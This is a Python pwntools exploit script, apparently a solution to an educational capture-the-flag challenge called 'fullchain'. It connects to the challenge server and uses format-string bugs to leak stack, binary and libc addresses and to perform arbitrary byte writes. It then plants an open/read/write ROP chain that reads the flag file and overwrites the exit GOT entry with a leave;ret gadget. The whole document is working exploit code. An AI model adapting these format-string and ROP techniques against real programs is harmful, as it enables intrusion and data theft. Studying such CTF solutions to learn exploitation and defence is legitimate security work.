#!/usr/bin/env python3

from pwn import *
import math

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF("./fullchain")
got_exit = elf.got["exit"]

r = remote("edu-ctf.zoolab.org", 30201)
# r = process("./fullchain")
# r = gdb.debug("./fullchain", """
# b chal
# b *chal+188
# b *chal+365
# b *chal+404
# b *chal+399
# c
# """)

def response_prompt(r, local_global, read_write):
    # print(local_global, read_write)
    r.sendlineafter(b"global or local > ", local_global)
    r.sendlineafter(b"set, read or write > ", read_write)

# leak "local" address
response_prompt(r, b"local", b"write%p")
r.recvuntil(b"write0x")
local_addr = int(r.recv(12), 16)
cnt_addr = local_addr + 0x20 - 0x2c

print("local_addr: ", hex(local_addr))
print("cnt_addr: ", hex(cnt_addr))

# reset cnt to 5 (len("write"))
response_prompt(r, b"local", b"read")
r.sendline(b'AAAAAAAAAAAAAAAA'+p64(cnt_addr))

response_prompt(r, b"local", b"write%16$n")

# set cnt to 1000
response_prompt(r, b"global", b"read")
r.sendline(b'%10000c%16$n')

response_prompt(r, b"global", b"write")
r.recv(10000)

# leak __libc_csu_init address
response_prompt(r, b"global", b"read")
r.sendline(b'%8$p')

response_prompt(r, b"global", b"write")
libc_csu_init_addr = int(r.recv(14)[2:], 16)
text_addr = libc_csu_init_addr - elf.symbols['__libc_csu_init']
got_exit_addr = text_addr + elf.got["exit"]

print("libc_csu_init_addr: ", hex(libc_csu_init_addr))
print("text_addr: ", hex(text_addr))
print("got_exit_addr: ", hex(got_exit_addr))

# leak libc address
got_printf_addr = text_addr + elf.got["printf"]
print("got_printf_addr: ", hex(got_printf_addr))

response_prompt(r, b"local", b"read")
r.sendline(b'A'*16+p64(got_printf_addr))

response_prompt(r, b"global", b"read")
r.sendline(b'%16$s')

response_prompt(r, b"global", b"write")
printf_addr = 0
for i in reversed(r.recv(6)):
    printf_addr <<= 8
    printf_addr += i
libc_addr = printf_addr - 0x64e10
print("libc_addr: ", hex(libc_addr))

# leak "global" address
global_addr = text_addr + 0x40b0
print("global_addr: ", hex(global_addr))

def change_control_ptr(r, addr, update_bits=None):
    def send_byte(addr, byte):
        response_prompt(r, b"local", b"read")
        r.sendline(b'A'*8+p64(addr))

        response_prompt(r, b"global", b"read")
        fmt = f'%15$hhn' if int(byte) == 0 else f'%{int(byte)}c%15$hhn'
        r.sendline(fmt.encode())

        response_prompt(r, b"global", b"write")
        r.recv(int(byte))

    print("change control pointer to", hex(addr))
    for i, byte in enumerate(reversed(p64(addr))):
        if update_bits and i < 8 - update_bits:
            continue
        send_byte(local_addr+23-i, byte)


def modify_byte(r, addr, byte):
    response_prompt(r, b"global", b"read")
    fmt = f'%16$hhn' if int(byte) == 0 else f'%{int(byte)}c%16$hhn'
    r.sendline(fmt.encode())

    print(f"modify {hex(addr)}, value: {hex(byte)}, fmt: {fmt}")
    response_prompt(r, b"global", b"write")
    r.recv(int(byte))


def modify(r, addr, data):
    update_bits = math.ceil(math.log2(len(data)) / 8) + 1
    change_control_ptr(r, addr)

    for i, b in enumerate(data):
        change_control_ptr(r, addr+i, update_bits)
        modify_byte(r, addr+i, b)


print("------")
print("write file name")
fn_addr = global_addr + 0x100 # /home/fullchain/flag
print("fn_addr", fn_addr)

modify(r, fn_addr, b"/home/fullchain/flag\x00")


print("------")
print("write ROP chain")

pop_rdi_ret = libc_addr + 0x26b72
pop_rsi_ret = libc_addr + 0x27529
pop_rax_ret = libc_addr + 0x4a550
pop_rdx_rbx_ret = libc_addr + 0x162866
syscall_ret = libc_addr + 0x66229
leave_ret = libc_addr + 0x5aa48

ROP = flat(
    pop_rdi_ret, fn_addr,
    pop_rsi_ret, 0,
    pop_rax_ret, 2,
    syscall_ret,

    pop_rdi_ret, 3,
    pop_rsi_ret, fn_addr,
    pop_rdx_rbx_ret, 0x20, 0x0,
    pop_rax_ret, 0,
    syscall_ret,

    pop_rdi_ret, 1,
    pop_rsi_ret, fn_addr,
    pop_rdx_rbx_ret, 0x20, 0x0,
    pop_rax_ret, 1,
    syscall_ret,
)

chal_ret_addr = local_addr + 0x8 * 5
print("chal_ret_addr", chal_ret_addr)
modify(r, chal_ret_addr, ROP)

# overwrite exit GOT to leave return gadget
print("------")
print("write exit GOT")
print("got_exit_addr", got_exit_addr)
modify(r, got_exit_addr, p64(leave_ret))

# reset cnt to 0
print("cnt_addr", hex(cnt_addr))
change_control_ptr(r, cnt_addr+3)
modify_byte(r, cnt_addr+3, 0)
change_control_ptr(r, cnt_addr+2)
modify_byte(r, cnt_addr+2, 0)
change_control_ptr(r, cnt_addr+1)
modify_byte(r, cnt_addr+1, 0)
change_control_ptr(r, cnt_addr+0)
modify_byte(r, cnt_addr+0, 0)

r.interactive()